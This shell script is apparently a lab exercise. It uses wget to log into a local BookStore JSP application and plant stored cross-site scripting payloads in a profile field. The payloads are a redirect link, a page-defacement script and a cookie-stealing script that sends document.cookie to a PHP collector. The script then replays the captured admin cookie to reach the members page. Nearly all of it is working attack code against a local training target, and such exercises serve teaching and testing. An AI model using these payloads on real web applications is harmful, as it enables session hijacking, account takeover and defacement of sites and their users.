#!/bin/sh
# Part 1 - XSS
# Consider we have created an account in the BookStore Application to order books.
wget 	--keep-session-cookies \
	--save-cookies userCookies.txt \
	--post-data="FormName=Login&Login=user&Password=abcdef&FormAction=login" \
	http://127.0.0.1:8080/bookstore/Login.jsp

# Site Redirection
wget    --load-cookies userCookies.txt \
	--post-data="FormName=Form&PK_member_id=2&member_password=abcdef&name=User&last_name=Account&email=guest@localhost&address=Chapin A 2000&notes=<html><body><a href=http://example.com>Dispatch Instructions</a></body></html>&FormAction=update" \
        http://127.0.0.1:8080/bookstore/MyInfo.jsp

# Defacement
wget    --load-cookies userCookies.txt \
	--post-data="FormName=Form&PK_member_id=2&member_password=abcdef&name=User&last_name=Account&email=guest@localhost&address=Chapin A 2000&notes=<script>document.getElementsByTagName(\'img\')[1].src = \'https://s3.amazonaws.com/ceblog/wp-content/uploads/2016/04/22110359/youve-been-hacked.png\';</script>&FormAction=update" \
        http://127.0.0.1:8080/bookstore/MyInfo.jsp

# Session Hijacking
# Login into your account as you are the end user
wget    --load-cookies userCookies.txt \
        --post-data="FormName=Form&PK_member_id=2&member_password=abcdef&name=User&last_name=Account&email=guest@localhost&address=Chapin A 2000&notes=<script>document.location='http://127.0.0.1/grabCookies.php?cookie='+document.cookie;</script>&FormAction=update" \
        http://127.0.0.1:8080/bookstore/MyInfo.jsp
# Run a test web server in the following way
cd Cookies
sudo php -S 127.0.0.1:80
# A cookies is generated for admin when admin clicks on user info in members. Now you have admin cookies. wget using his cookies.
wget 	--load-cookies myinfo.txt \
	http://127.0.0.1:8080/bookstore/MembersGrid.jsp

